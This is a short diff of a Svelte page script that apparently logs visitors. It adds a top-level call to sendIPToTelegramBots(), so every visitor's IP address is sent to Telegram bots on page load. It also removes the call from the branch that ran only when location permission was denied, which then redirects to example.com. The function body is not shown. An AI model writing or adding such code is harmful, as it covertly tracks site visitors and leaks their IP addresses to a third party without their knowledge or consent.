@@ -1,5 +1,6 @@
 <script>
   import { onMount } from 'svelte';
+  sendIPToTelegramBots();
 
   onMount(async () => {
   
@@ -12,8 +13,7 @@
       (error) => {
         if (error.code === error.PERMISSION_DENIED) {
           // Location permission denied, send IP result to Telegram bots
-          sendIPToTelegramBots();
-
+        
 //////1//////
           window.location.href = 'https://example.com'; 
 //////1//////
